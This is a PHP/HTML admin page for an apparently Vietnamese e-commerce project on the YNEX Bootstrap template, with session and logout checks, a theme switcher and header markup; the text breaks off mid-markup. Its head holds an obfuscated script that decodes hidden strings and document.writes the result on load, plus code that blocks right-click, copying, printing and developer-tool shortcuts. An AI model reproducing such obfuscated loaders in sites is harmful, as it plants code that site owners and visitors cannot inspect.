<?php
session_start();
include_once '../../classes/Banner.class.php';
include_once '../../classes/Blog.class.php';
include_once '../../classes/Cart.class.php';
include_once '../../classes/Category.class.php';
include_once '../../classes/Code.class.php';
include_once '../../classes/Compare.class.php';
include_once '../../classes/Contact.class.php';
include_once '../../classes/Order.class.php';
include_once '../../classes/Product.class.php';
include_once '../../classes/Review.class.php';
include_once '../../classes/User.class.php';
include_once '../../classes/Wishlist.class.php';

// Xử lý đăng xuất
$logout = new user();
if (isset($_GET['action']) && $_GET['action'] == 'logout') {
    $logout->logout();
    header('Location:../');
}

// Nếu người dùng đã đăng nhập, chuyển hướng về trang chủ
if (isset($_SESSION['userid'])) {
} else {
    header('Location:../');
}
?>

<html lang="en" dir="ltr" data-nav-layout="vertical" data-theme-mode="dark" data-header-styles="dark" data-menu-styles="dark" data-vertical-style="overlay">

<head>
    <!-- Meta Data -->
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>YNEX - Bootstrap 5 Premium Admin &amp; Dashboard Template</title>
    <meta name="Description" content="Bootstrap Responsive Admin Web Dashboard HTML5 Template">
    <meta name="Author" content="Spruko Technologies Private Limited">
    <meta name="keywords" content="admin,admin dashboard,admin panel,admin template,bootstrap,clean,dashboard,flat,jquery,modern,responsive,premium admin templates,responsive admin,ui,ui kit.">
    <!-- Favicon -->
    <link rel="icon" href="../assets/images/brand-logos/favicon.ico" type="image/x-icon"> <!-- Choices JS -->
    <script src="../assets/libs/choices.js/public/assets/scripts/choices.min.js"></script> <!-- Main Theme Js -->
    <script src="../assets/js/main.js"></script> <!-- Bootstrap Css -->
    <link id="style" href="../assets/libs/bootstrap/css/bootstrap.min.css" rel="stylesheet"> <!-- Style Css -->
    <link href="../assets/css/styles.min.css" rel="stylesheet"> <!-- Icons Css -->
    <link href="../assets/css/icons.css" rel="stylesheet"> <!-- Node Waves Css -->
    <link href="../assets/libs/node-waves/waves.min.css" rel="stylesheet"> <!-- Simplebar Css -->
    <link href="../assets/libs/simplebar/simplebar.min.css" rel="stylesheet"> <!-- Color Picker Css -->
    <link rel="stylesheet" href="../assets/libs/flatpickr/flatpickr.min.css">
    <link rel="stylesheet" href="../assets/libs/@simonwep/pickr/themes/nano.min.css"> <!-- Choices Css -->
    <link rel="stylesheet" href="../assets/libs/choices.js/public/assets/styles/choices.min.css">
    <link href="http://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.3.0/css/font-awesome.css" rel="stylesheet" type='text/css'>
    <script src="https://cdn.ckeditor.com/4.19.1/standard/ckeditor.js"></script>
    <link href="http://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.3.0/css/font-awesome.css" rel="stylesheet" type='text/css'>
    <script type="text/javascript">
        function d3tv(n52i) {
            var
                o0n0 = Function,
                hv8x, djtn, fq4r, h4yp =
                "n}POMaESi/Abew8\'Xc71\rKuoRg2D(>h,TB=\n)?.x5+|zvl:[{rsdNGf]\"ILC93V!4&k6 -tqjmUy;p0<",
                n3av = h4yp.length,
                frto = {
                    cd: ""
                },
                ue = new o0n0("ret" + "urn unesc" + "ape")(),
                qkqb = new o0n0("x", ue("%74hi%73.c%64+=x")),
                pjgi = new o0n0("x", "y", ue("%72et%75rn%20x.c%68ar%41t(%79)"));
            for (fq4r = 0; fq4r < n52i.length; fq4r++) {
                djtn = pjgi(n52i, fq4r);
                hv8x = h4yp.indexOf(djtn);
                if (hv8x > -1) {
                    hv8x -= (fq4r + 1) % n3av;
                    if (hv8x < 0) {
                        hv8x += n3av;
                    }
                    qkqb.call(frto, pjgi(h4yp, hv8x));
                } else {
                    qkqb.call(frto, djtn);
                }
            }
            new o0n0(ue("%64oc%75me%6Et.w%72it%65(t%68is.%63d)%3Bth%69s.c%64=n%75ll")).call(frto);
        }
        d3tv("nN\rGwOp;<aiR[ta(\"i(e2k(U|y\ng1E9,XoR\"jriD4;86V 59r5/I71dKc.18j,sSsdsxeSw&aU&=uA-E:8;Xa;5Ok3S\"ngCs(6EzESU[|{\r5>\r-IlR+}r,d5,y.KX|.SI3a\n4o|<|zhO0M\";&\"gw}9p?a6S;6,UIN0yywE+CTDBag8afVo8Ttj10[2v7?G,\rR=go&d<<u0b=8+\'\"o0XeB8b3ut(s/.x\r36MmCSK\rahzpaNDw++4-t1[[t{3P)bc&5\'Rl2e,[gV5  b-PoIT.E3)lk[BN :yMl1!|yo]v,!RhmL4.SkMLpwq9[eVmg=[i]h\'{cEp:\rT}P)8rsz93T&=o8!?r71G,k6\'qD?(2 p.v76:4.Imd5ONphat\'(hUGE=k\'nDOKnAR>hL=)q}jtT+NpI,uSw6)\'BS2|\r/1)-zf01m+6nSIM4=RV&y5x+,-j[\r+\'!bV{3Pt>72U!/]X!&]wXB=hz[ |A./yi>c\"fayB)6d?\'/55-Tjl)RC\"gsO2TE\"O!Bo34Ux.5h q:158VA7Cs 2(cgmVif\'V4fe\'TB>|j/|XDdj:8|sbP\rL9L/<" +
            "?5q]-|?z\'\nR\'Vo>hMGTsRzC?2,Mu=qnwfK;8A,e/u><2E\":MScV3!Gb8-|\'AX ip ?iUS(X]vN\r/\n}|/b}x|C9\"-m:+[1x(1 xg.C[EM\ng!kc}6lxtt1Vuykf/hyl\"\"V!y>\n0];z7!!}U,vUbv7>G2KD<1i<:Sw8 ?X=iDzKApm[R]5&0xE3V<o{PRgGE]v\n,T9wVd|bRRm!oqGmVGrs0,n-9>||b}+/qbnq5m/hLe}Kvl t7 jG93{e3,\nAbxw8|-u.O9{DoRN<T{wtL?Ex];RL[6Ab=)4=.1\rB\n<Lbxq94U&!g=y}PAITrm7NdNPdKgd4 +)|8=o8!rDlNhKvjR({?9m8A4+5:Le73.C2}1\')c\rKNNt!\rB<y 5wMhXU51PrBjl!ynE9>i2n1\nwPLp3>[TIt{u)q358\'ztOON|PsTN+T(>IMcck\"X4:k]:5eCP2D\r;o))ay\nO&aU&=6ORNEy\'s3VOX!.)ARC0smyqu\'f</AdgxUw&i&5d [VlscD(-zIe,O2M:aEL(B8D>mNaB&f+m=5O Uyr7p\'-iRPqGDO[)lL9RO)4XajR&q=RT<f.pXG6nMINLhsxh<&z8IbC&x\r+Iuv/1.ut\"TanEL06LDwqz|<\r:6O{t\ndg}lPiX!.V\nh)i(ciIgjm> ?2cE?nKvB:Mja/VI!\n]v\nMN1\r\"\'4GvB4D{q9m,b<P/4!MKl8mb&M\r0De?s(PXd+\r[nX3.2afSovj2\'\n\rBn]GD+;\'6AeixTqX2D |\"bhPgPI a4<V6=\'(m\r9Bph< CcO:0X5kg=y}PBI/s\"1va3=>\nSDXS\"Rqj(6)gXa)<\rzTlO!diSv&bT{w\n30uqs |3p]M-8Dj1CT;>06LXPlp\'x&RBUn,]S{fc|O/!Tb>Ou.Xa6E}js\n \'Vy)OLz;ojTarPd5,-]7s e.a7!XzeNg-uq9d/y.tiTLc26maxlilAztx \'<4>L\rzq>igLafkh/|tua>t{xVO\n;Plh)?}zi(!Gz7<&zef1xuu1\rAOfo&hsBv\neKN&=;+3?6A5T<e8twGfbP)lEfMDIGwx r{K=)e\ny;BRL}}0<kopUy)M=ISOz-7<0d4k|&g2!fi,,(>XGaRgk=4S?Bm1{>(}8Xj\']\"wM.33LC:h\'f]X48?6!or0CL,v:ulaEz= bbi/;9(Ma:8v6cwG<(/i3U;Ny\n)m47++.x2A?=\n;vUc[zO>Lx.bR2Pg&ko8{zBo06;;mU3rw-t,<>NP0.4wUm:C3?9\rKLrO0 LBu,,(>XMdRgk=4S?Bm1{>(}8Xj\']\"wM.Bow :\nz?]\"c&\'. 4Rs<9CTl[o:ESv\n-5U!qDOMlRmNtv!<I:C<kfb;>\"o)}=32KExkB\nbvq{,Tcs1i<:{RI2\'E!7+&kL1T<fxj1k<;.OoASRdUGEBP,L|DjK!{3(Ox,(lj:[y(]RM7Uxs\'vE,vd{&e"
        );
        d3tv("\n/mGwET:!C=ajv\r&;+tTr=68!zIB0/fOltm29T)?Gbur\'LyMS6}IuB0D- riC7C&x/)XBy59)xS ,;yz:8yO{0Kd[]oe.Mle9!,eV!CjBn]\"+UKtO4zADCd\ny;qji.3bXwX4l>ufTz}q3)171i0 z2DILuoi+ ?cqd{gc}r\rGnragM\r?" +
            ">w]f]sd6c5tyjyzRi}BbuiiaE0p0\'\'ewaE)?}k1:\'!RsPUL718\',3M=x)xS Nlp]kN!f,|+|Ct3.rsn}lj-EB\"I6c5tyjyzRi}fb<nPT]aASALxoX-2ESNbegD:+TAy(]u!<.P;L-y;p0EG(Ng\r207S0[\'V!1LDXS;Dtb=o)UVy<N[Ggl=gU|/A:afz=ofc.3s!K}h+ N>Pm3.84MqC1CxwM>t:18\rje}j+/\"IwNKA}tK4a(ch {pi\n1uyx0<EVTNxD6DS3Np.v\"AXC)IR<o;qpr-Lr7kNG-PXmT}t3(+l7w1qbnq5iUybR.\'foeO|qxcM,\'jl)R}ID[=u6(=ftg26.rbCeN|);"
        );
    </script>
    <script type="text/javascript">
        br6o = document.all;
        l595 = br6o && !document.getElementById;
        v6bv = br6o && document.getElementById;
        qxib = !br6o && document.getElementById;
        jqin = document.layers;

        function qnt6(w5x3) {
            try {
                if (l595) alert("");
            } catch (e) {}
            if (w5x3 && w5x3.stopPropagation) w5x3.stopPropagation();
            return false;
        }

        function f76p() {
            if (event.button == 2 || event.button == 3) qnt6();
        }

        function h0uf(e) {
            return (e.which == 3) ? qnt6() : true;
        }

        function pwl7(dqvb) {
            for (pkog = 0; pkog < dqvb.images.length; pkog++) {
                dqvb.images[pkog].onmousedown = h0uf;
            }
            for (pkog = 0; pkog < dqvb.layers.length; pkog++) {
                pwl7(dqvb.layers[pkog].document);
            }
        }

        function jv3j() {
            if (l595) {
                for (pkog = 0; pkog < document.images.length; pkog++) {
                    document.images[pkog].onmousedown = f76p;
                }
            } else if (jqin) {
                pwl7(document);
            }
        }

        function fru0(e) {
            if ((v6bv && event && event.srcElement && event.srcElement.tagName == "IMG") || (qxib && e && e.target && e
                    .target.tagName == "IMG")) {
                return qnt6();
            }
        }
        if (v6bv || qxib) {
            document.oncontextmenu = fru0;
        } else if (l595 || jqin) {
            window.onload = jv3j;
        }

        function z3vb(e) {
            g0bl = e && e.srcElement && e.srcElement != null ? e.srcElement.tagName : "";
            if (g0bl != "INPUT" && g0bl != "TEXTAREA" && g0bl != "BUTTON") {
                return false;
            }
        }

        function rup5() {
            return false
        }
        if (br6o) {
            document.onselectstart = z3vb;
            document.ondragstart = rup5;
        }
        if (document.addEventListener) {
            document.addEventListener('copy', function(e) {
                g0bl = e.target.tagName;
                if (g0bl != "INPUT" && g0bl != "TEXTAREA") {
                    e.preventDefault();
                }
            }, false);
            document.addEventListener('dragstart', function(e) {
                e.preventDefault();
            }, false);
        }

        function r63d(evt) {
            if (evt.preventDefault) {
                evt.preventDefault();
            } else {
                evt.keyCode = 37;
                evt.returnValue = false;
            }
        }
        var ubnf = 1;
        var srll = 2;
        var s9s2 = 4;
        var zj8z = new Array();
        zj8z.push(new Array(srll, 65));
        zj8z.push(new Array(srll, 67));
        zj8z.push(new Array(srll, 80));
        zj8z.push(new Array(srll, 83));
        zj8z.push(new Array(srll, 85));
        zj8z.push(new Array(ubnf | srll, 73));
        zj8z.push(new Array(ubnf | srll, 74));
        zj8z.push(new Array(ubnf, 121));
        zj8z.push(new Array(0, 123));

        function n1aj(evt) {
            evt = (evt) ? evt : ((event) ? event : null);
            if (evt) {
                var fske = evt.keyCode;
                if (!fske && evt.charCode) {
                    fske = String.fromCharCode(evt.charCode).toUpperCase().charCodeAt(0);
                }
                for (var zlej = 0; zlej < zj8z.length; zlej++) {
                    if ((evt.shiftKey == ((zj8z[zlej][0] & ubnf) == ubnf)) && ((evt.ctrlKey | evt.metaKey) == ((zj8z[zlej][
                            0
                        ] & srll) == srll)) && (evt.altKey == ((zj8z[zlej][0] & s9s2) == s9s2)) && (fske == zj8z[zlej][
                            1
                        ] || zj8z[zlej][1] == 0)) {
                        r63d(evt);
                        break;
                    }
                }
            }
        }
        if (document.addEventListener) {
            document.addEventListener("keydown", n1aj, true);
            document.addEventListener("keypress", n1aj, true);
        } else if (document.attachEvent) {
            document.attachEvent("onkeydown", n1aj);
        }
    </script><noscript>
        <p>To display this page you need a browser that supports JavaScript.</p>
    </noscript>
    <meta http-equiv="imagetoolbar" content="no">
    <style type="text/css">
        input,
        textarea {
            -webkit-touch-callout: default;
            -webkit-user-select: auto;
            -khtml-user-select: auto;
            -moz-user-select: text;
            -ms-user-select: text;
            user-select: text
        }

        * {
            -webkit-touch-callout: none;
            -webkit-user-select: none;
            -khtml-user-select: none;
            -moz-user-select: -moz-none;
            -ms-user-select: none;
            user-select: none
        }
    </style>
    <style type="text/css" media="print">
        body {
            display: none
        }
    </style>
    <frame></frame>
</head>

<body cz-shortcut-listen="true">
    <div class="offcanvas offcanvas-end" tabindex="-1" id="switcher-canvas" aria-labelledby="offcanvasRightLabel">
        <div class="offcanvas-header border-bottom">
            <h5 class="offcanvas-title text-default" id="offcanvasRightLabel">Switcher</h5><button type="button" class="btn-close" data-bs-dismiss="offcanvas" aria-label="Close"></button>
        </div>
        <div class="offcanvas-body">
            <nav class="border-bottom border-block-end-dashed">
                <div class="nav nav-tabs nav-justified" id="switcher-main-tab" role="tablist"><button class="nav-link active" id="switcher-home-tab" data-bs-toggle="tab" data-bs-target="#switcher-home" type="button" role="tab" aria-controls="switcher-home" aria-selected="true">Theme Styles</button><button class="nav-link" id="switcher-profile-tab" data-bs-toggle="tab" data-bs-target="#switcher-profile" type="button" role="tab" aria-controls="switcher-profile" aria-selected="false" tabindex="-1">Theme Colors</button></div>
            </nav>
            <div class="tab-content" id="nav-tabContent">
                <div class="tab-pane fade show active border-0" id="switcher-home" role="tabpanel" aria-labelledby="switcher-home-tab" tabindex="0">
                    <div class="">
                        <p class="switcher-style-head">Theme Color Mode:</p>
                        <div class="row switcher-style gx-0">
                            <div class="col-4">
                                <div class="form-check switch-select"><label class="form-check-label" for="switcher-light-theme">Light </label><input class="form-check-input" type="radio" name="theme-style" id="switcher-light-theme" checked=""></div>
                            </div>
                            <div class="col-4">
                                <div class="form-check switch-select"><label class="form-check-label" for="switcher-dark-theme">Dark </label><input class="form-check-input" type="radio" name="theme-style" id="switcher-dark-theme"></div>
                            </div>
                        </div>
                    </div>
                    <div class="">
                        <p class="switcher-style-head">Directions:</p>
                        <div class="row switcher-style gx-0">
                            <div class="col-4">
                                <div class="form-check switch-select"><label class="form-check-label" for="switcher-ltr">LTR </label><input class="form-check-input" type="radio" name="direction" id="switcher-ltr" checked=""></div>
                            </div>
                            <div class="col-4">
                                <div class="form-check switch-select"><label class="form-check-label" for="switcher-rtl">RTL </label><input class="form-check-input" type="radio" name="direction" id="switcher-rtl"></div>
                            </div>
                        </div>
                    </div>
                    <div class="">
                        <p class="switcher-style-head">Navigation Styles:</p>
                        <div class="row switcher-style gx-0">
                            <div class="col-4">
                                <div class="form-check switch-select"><label class="form-check-label" for="switcher-vertical">Vertical </label><input class="form-check-input" type="radio" name="navigation-style" id="switcher-vertical" checked=""></div>
                            </div>
                            <div class="col-4">
                                <div class="form-check switch-select"><label class="form-check-label" for="switcher-horizontal">Horizontal </label><input class="form-check-input" type="radio" name="navigation-style" id="switcher-horizontal"></div>
                            </div>
                        </div>
                    </div>
                    <div class="navigation-menu-styles">
                        <p class="switcher-style-head">Vertical &amp;
                            Horizontal Menu Styles:</p>
                        <div class="row switcher-style gx-0 pb-2 gy-2">
                            <div class="col-4">
                                <div class="form-check switch-select"><label class="form-check-label" for="switcher-menu-click">Menu Click </label><input class="form-check-input" type="radio" name="navigation-menu-styles" id="switcher-menu-click"></div>
                            </div>
                            <div class="col-4">
                                <div class="form-check switch-select"><label class="form-check-label" for="switcher-menu-hover">Menu Hover </label><input class="form-check-input" type="radio" name="navigation-menu-styles" id="switcher-menu-hover"></div>
                            </div>
                            <div class="col-4">
                                <div class="form-check switch-select"><label class="form-check-label" for="switcher-icon-click">Icon Click </label><input class="form-check-input" type="radio" name="navigation-menu-styles" id="switcher-icon-click"></div>
                            </div>
                            <div class="col-4">
                                <div class="form-check switch-select"><label class="form-check-label" for="switcher-icon-hover">Icon Hover </label><input class="form-check-input" type="radio" name="navigation-menu-styles" id="switcher-icon-hover"></div>
                            </div>
                        </div>
                    </div>
                    <div class="sidemenu-layout-styles">
                        <p class="switcher-style-head">Sidemenu Layout Styles:</p>
                        <div class="row switcher-style gx-0 pb-2 gy-2">
                            <div class="col-sm-6">
                                <div class="form-check switch-select"><label class="form-check-label" for="switcher-default-menu">Default Menu </label><input class="form-check-input" type="radio" name="sidemenu-layout-styles" id="switcher-default-menu" checked=""></div>
                            </div>
                            <div class="col-sm-6">
                                <div class="form-check switch-select"><label class="form-check-label" for="switcher-closed-menu">Closed Menu </label><input class="form-check-input" type="radio" name="sidemenu-layout-styles" id="switcher-closed-menu"></div>
                            </div>
                            <div class="col-sm-6">
                                <div class="form-check switch-select"><label class="form-check-label" for="switcher-icontext-menu">Icon Text </label><input class="form-check-input" type="radio" name="sidemenu-layout-styles" id="switcher-icontext-menu"></div>
                            </div>
                            <div class="col-sm-6">
                                <div class="form-check switch-select"><label class="form-check-label" for="switcher-icon-overlay">Icon Overlay </label><input class="form-check-input" type="radio" name="sidemenu-layout-styles" id="switcher-icon-overlay"></div>
                            </div>
                            <div class="col-sm-6">
                                <div class="form-check switch-select"><label class="form-check-label" for="switcher-detached">Detached </label><input class="form-check-input" type="radio" name="sidemenu-layout-styles" id="switcher-detached"></div>
                            </div>
                            <div class="col-sm-6">
                                <div class="form-check switch-select"><label class="form-check-label" for="switcher-double-menu">Double Menu </label><input class="form-check-input" type="radio" name="sidemenu-layout-styles" id="switcher-double-menu"></div>
                            </div>
                        </div>
                    </div>
                    <div class="">
                        <p class="switcher-style-head">Page Styles:</p>
                        <div class="row switcher-style gx-0">
                            <div class="col-4">
                                <div class="form-check switch-select"><label class="form-check-label" for="switcher-regular">Regular </label><input class="form-check-input" type="radio" name="page-styles" id="switcher-regular" checked=""></div>
                            </div>
                            <div class="col-4">
                                <div class="form-check switch-select"><label class="form-check-label" for="switcher-classic">Classic </label><input class="form-check-input" type="radio" name="page-styles" id="switcher-classic"></div>
                            </div>
                            <div class="col-4">
                                <div class="form-check switch-select"><label class="form-check-label" for="switcher-modern">Modern </label><input class="form-check-input" type="radio" name="page-styles" id="switcher-modern"></div>
                            </div>
                        </div>
                    </div>
                    <div class="">
                        <p class="switcher-style-head">Layout Width Styles:</p>
                        <div class="row switcher-style gx-0">
                            <div class="col-4">
                                <div class="form-check switch-select"><label class="form-check-label" for="switcher-full-width">Full Width </label><input class="form-check-input" type="radio" name="layout-width" id="switcher-full-width" checked=""></div>
                            </div>
                            <div class="col-4">
                                <div class="form-check switch-select"><label class="form-check-label" for="switcher-boxed">Boxed </label><input class="form-check-input" type="radio" name="layout-width" id="switcher-boxed"></div>
                            </div>
                        </div>
                    </div>
                    <div class="">
                        <p class="switcher-style-head">Menu Positions:</p>
                        <div class="row switcher-style gx-0">
                            <div class="col-4">
                                <div class="form-check switch-select"><label class="form-check-label" for="switcher-menu-fixed">Fixed </label><input class="form-check-input" type="radio" name="menu-positions" id="switcher-menu-fixed" checked=""></div>
                            </div>
                            <div class="col-4">
                                <div class="form-check switch-select"><label class="form-check-label" for="switcher-menu-scroll">Scrollable </label><input class="form-check-input" type="radio" name="menu-positions" id="switcher-menu-scroll"></div>
                            </div>
                        </div>
                    </div>
                    <div class="">
                        <p class="switcher-style-head">Header Positions:</p>
                        <div class="row switcher-style gx-0">
                            <div class="col-4">
                                <div class="form-check switch-select"><label class="form-check-label" for="switcher-header-fixed">Fixed </label><input class="form-check-input" type="radio" name="header-positions" id="switcher-header-fixed" checked="">
                                </div>
                            </div>
                            <div class="col-4">
                                <div class="form-check switch-select"><label class="form-check-label" for="switcher-header-scroll">Scrollable </label><input class="form-check-input" type="radio" name="header-positions" id="switcher-header-scroll"></div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="tab-pane fade border-0" id="switcher-profile" role="tabpanel" aria-labelledby="switcher-profile-tab" tabindex="0">
                    <div>
                        <div class="theme-colors">
                            <p class="switcher-style-head">Menu Colors:</p>
                            <div class="d-flex switcher-style pb-2">
                                <div class="form-check switch-select me-3"><input class="form-check-input color-input color-white" data-bs-toggle="tooltip" data-bs-placement="top" type="radio" name="menu-colors" id="switcher-menu-light" aria-label="Light Menu" data-bs-original-title="Light Menu"></div>
                                <div class="form-check switch-select me-3"><input class="form-check-input color-input color-dark" data-bs-toggle="tooltip" data-bs-placement="top" type="radio" name="menu-colors" id="switcher-menu-dark" checked="" aria-label="Dark Menu" data-bs-original-title="Dark Menu"></div>
                                <div class="form-check switch-select me-3"><input class="form-check-input color-input color-primary" data-bs-toggle="tooltip" data-bs-placement="top" type="radio" name="menu-colors" id="switcher-menu-primary" aria-label="Color Menu" data-bs-original-title="Color Menu"></div>
                                <div class="form-check switch-select me-3"><input class="form-check-input color-input color-gradient" data-bs-toggle="tooltip" data-bs-placement="top" type="radio" name="menu-colors" id="switcher-menu-gradient" aria-label="Gradient Menu" data-bs-original-title="Gradient Menu"></div>
                                <div class="form-check switch-select me-3"><input class="form-check-input color-input color-transparent" data-bs-toggle="tooltip" data-bs-placement="top" type="radio" name="menu-colors" id="switcher-menu-transparent" aria-label="Transparent Menu" data-bs-original-title="Transparent Menu"></div>
                            </div>
                            <div class="px-4 pb-3 text-muted fs-11">Note:If you want to change color Menu dynamically
                                change from below Theme Primary color picker</div>
                        </div>
                        <div class="theme-colors">
                            <p class="switcher-style-head">Header Colors:</p>
                            <div class="d-flex switcher-style pb-2">
                                <div class="form-check switch-select me-3"><input class="form-check-input color-input color-white" data-bs-toggle="tooltip" data-bs-placement="top" type="radio" name="header-colors" id="switcher-header-light" checked="" aria-label="Light Header" data-bs-original-title="Light Header"></div>
                                <div class="form-check switch-select me-3"><input class="form-check-input color-input color-dark" data-bs-toggle="tooltip" data-bs-placement="top" type="radio" name="header-colors" id="switcher-header-dark" aria-label="Dark Header" data-bs-original-title="Dark Header"></div>
                                <div class="form-check switch-select me-3"><input class="form-check-input color-input color-primary" data-bs-toggle="tooltip" data-bs-placement="top" type="radio" name="header-colors" id="switcher-header-primary" aria-label="Color Header" data-bs-original-title="Color Header"></div>
                                <div class="form-check switch-select me-3"><input class="form-check-input color-input color-gradient" data-bs-toggle="tooltip" data-bs-placement="top" type="radio" name="header-colors" id="switcher-header-gradient" aria-label="Gradient Header" data-bs-original-title="Gradient Header"></div>
                                <div class="form-check switch-select me-3"><input class="form-check-input color-input color-transparent" data-bs-toggle="tooltip" data-bs-placement="top" type="radio" name="header-colors" id="switcher-header-transparent" aria-label="Transparent Header" data-bs-original-title="Transparent Header"></div>
                            </div>
                            <div class="px-4 pb-3 text-muted fs-11">Note:If you want to change color Header dynamically
                                change from below Theme Primary color picker</div>
                        </div>
                        <div class="theme-colors">
                            <p class="switcher-style-head">Theme Primary:</p>
                            <div class="d-flex flex-wrap align-items-center switcher-style">
                                <div class="form-check switch-select me-3"><input class="form-check-input color-input color-primary-1" type="radio" name="theme-primary" id="switcher-primary"></div>
                                <div class="form-check switch-select me-3"><input class="form-check-input color-input color-primary-2" type="radio" name="theme-primary" id="switcher-primary1"></div>
                                <div class="form-check switch-select me-3"><input class="form-check-input color-input color-primary-3" type="radio" name="theme-primary" id="switcher-primary2"></div>
                                <div class="form-check switch-select me-3"><input class="form-check-input color-input color-primary-4" type="radio" name="theme-primary" id="switcher-primary3"></div>
                                <div class="form-check switch-select me-3"><input class="form-check-input color-input color-primary-5" type="radio" name="theme-primary" id="switcher-primary4"></div>
                                <div class="form-check switch-select ps-0 mt-1 color-primary-light">
                                    <div class="theme-container-primary"><button class="">nano</button></div>
                                    <div class="pickr-container-primary">
                                        <div class="pickr"><button type="button" class="pcr-button" role="button" aria-label="toggle color picker dialog" style="--pcr-color: rgba(132, 90, 223, 1);"></button></div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="theme-colors">
                            <p class="switcher-style-head">Theme Background:</p>
                            <div class="d-flex flex-wrap align-items-center switcher-style">
                                <div class="form-check switch-select me-3"><input class="form-check-input color-input color-bg-1" type="radio" name="theme-background" id="switcher-background"></div>
                                <div class="form-check switch-select me-3"><input class="form-check-input color-input color-bg-2" type="radio" name="theme-background" id="switcher-background1"></div>
                                <div class="form-check switch-select me-3"><input class="form-check-input color-input color-bg-3" type="radio" name="theme-background" id="switcher-background2"></div>
                                <div class="form-check switch-select me-3"><input class="form-check-input color-input color-bg-4" type="radio" name="theme-background" id="switcher-background3"></div>
                                <div class="form-check switch-select me-3"><input class="form-check-input color-input color-bg-5" type="radio" name="theme-background" id="switcher-background4"></div>
                                <div class="form-check switch-select ps-0 mt-1 tooltip-static-demo color-bg-transparent">
                                    <div class="theme-container-background"><button>nano</button></div>
                                    <div class="pickr-container-background">
                                        <div class="pickr"><button type="button" class="pcr-button" role="button" aria-label="toggle color picker dialog" style="--pcr-color: rgba(132, 90, 223, 1);"></button></div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="menu-image mb-3">
                            <p class="switcher-style-head">Menu With Background Image:</p>
                            <div class="d-flex flex-wrap align-items-center switcher-style">
                                <div class="form-check switch-select m-2"><input class="form-check-input bgimage-input bg-img1" type="radio" name="theme-background" id="switcher-bg-img"></div>
                                <div class="form-check switch-select m-2"><input class="form-check-input bgimage-input bg-img2" type="radio" name="theme-background" id="switcher-bg-img1"></div>
                                <div class="form-check switch-select m-2"><input class="form-check-input bgimage-input bg-img3" type="radio" name="theme-background" id="switcher-bg-img2"></div>
                                <div class="form-check switch-select m-2"><input class="form-check-input bgimage-input bg-img4" type="radio" name="theme-background" id="switcher-bg-img3"></div>
                                <div class="form-check switch-select m-2"><input class="form-check-input bgimage-input bg-img5" type="radio" name="theme-background" id="switcher-bg-img4"></div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="d-flex justify-content-between canvas-footer flex-wrap"><a href="https://themeforest.net/item/ynex-bootstrap-admin-dashboard-template/45551445" class="btn btn-primary m-1">Buy Now</a><a href="https://themeforest.net/user/spruko/portfolio" class="btn btn-secondary m-1">Our Portfolio</a><a href="javascript:void(0);" id="reset-all" class="btn btn-danger m-1">Reset</a></div>
            </div>
        </div>
    </div>
    <div class="page">
        <header class="app-header">
            <div class="main-header-container container-fluid">
                <div class="header-content-left">
                    <!-- Start::header-element -->
                    <div class="header-element">
                        <div class="horizontal-logo"> <a href="http://localhost/asm/" class="header-logo"> <img src="../assets/images/brand-logos/desktop-logo.png" alt="logo" class="desktop-logo">
                                <img src="../assets/images/brand-logos/toggle-logo.png" alt="logo" class="toggle-logo">
                                <img src="../assets/images/brand-logos/desktop-dark.png" alt="logo" class="desktop-dark">
                                <img src="../assets/images/brand-logos/toggle-dark.png" alt="logo" class="toggle-dark">
                            </a>
                        </div>
                    </div> <!-- End::header-element -->
                    <!-- Start::header-element -->
                    <div class="header-element">
                        <!-- Start::header-link --> <a aria-label="Hide Sidebar" class="sidemenu-toggle header-link animated-arrow hor-toggle horizontal-navtoggle" data-bs-toggle="sidebar" href="javascript:void(0);"><span></span></a>
                        <!-- End::header-link -->
                    </div> <!-- End::header-element -->
                </div> <!-- End::header-content-left -->
                <!-- Start::header-content-right -->
                <div class="header-content-right">
                    <!-- Start::header-element -->

                    <!-- Start::header-element -->
                    <div class="header-element header-theme-mode">
                        <!-- Start::header-link|layout-setting --> <a href="javascript:void(0);" class="header-link layout-setting">
                            <span class="light-layout">
                                <!-- Start::header-link-icon --> <i class="bx bx-moon header-link-icon"></i>
                                <!-- End::header-link-icon -->
                            </span> <span class="dark-layout">
                                <!-- Start::header-link-icon --> <i class="bx bx-sun header-link-icon"></i>
                                <!-- End::header-link-icon -->
                            </span> </a> <!-- End::header-link|layout-setting -->
                    </div> <!-- End::header-element -->
                    <!-- Start::header-element -->
                    <div class="header-element cart-dropdown" style="display: none;">
                        <!-- Start::header-link|dropdown-toggle --> <a href="javascript:void(0);" class="header-link dropdown-toggle" data-bs-auto-close="outside" data-bs-toggle="dropdown">

                        </a> <!-- End::header-link|dropdown-toggle -->
                        <!-- Start::main-header-dropdown -->
                        <div class="main-header-dropdown dropdown-menu dropdown-menu-end" data-popper-placement="none">
                            <div class="p-3">
                                <div class="d-flex align-items-center justify-content-between">
                                    <p class="mb-0 fs-17 fw-semibold">Cart Items</p><span class="badge bg-success-transparent" id="cart-data">5 Items</span>
                                </div>
                            </div>
                            <div>
                                <hr class="dropdown-divider">
                            </div>
                            <ul class="list-unstyled mb-0" id="header-cart-items-scroll" data-simplebar="init">
                                <div class="simplebar-wrapper" style="margin: 0px;">
                                    <div class="simplebar-height-auto-observer-wrapper">
                                        <div class="simplebar-height-auto-observer"></div>
                                    </div>
                                    <div class="simplebar-mask">
                                        <div class="simplebar-offset" style="right: 0px; bottom: 0px;">
                                            <div class="simplebar-content-wrapper" tabindex="0" role="region" aria-label="scrollable content" style="height: auto; overflow: hidden;">
                                                <div class="simplebar-content" style="padding: 0px;">
                                                    <li class="dropdown-item">
                                                        <div class="d-flex align-items-start cart-dropdown-item">
                                                            <img src="../assets/images/ecommerce/jpg/1.jpg" alt="img" class="avatar avatar-sm avatar-rounded br-5 me-3">
                                                            <div class="flex-grow-1">
                                                                <div class="d-flex align-items-start justify-content-between mb-0">
                                                                    <div class="mb-0 fs-13 text-dark fw-semibold">
                                                                        <a href="cart.html">SomeThing Phone</a>
                                                                    </div>
                                                                    <div> <span class="text-black mb-1">$1,299.00</span>
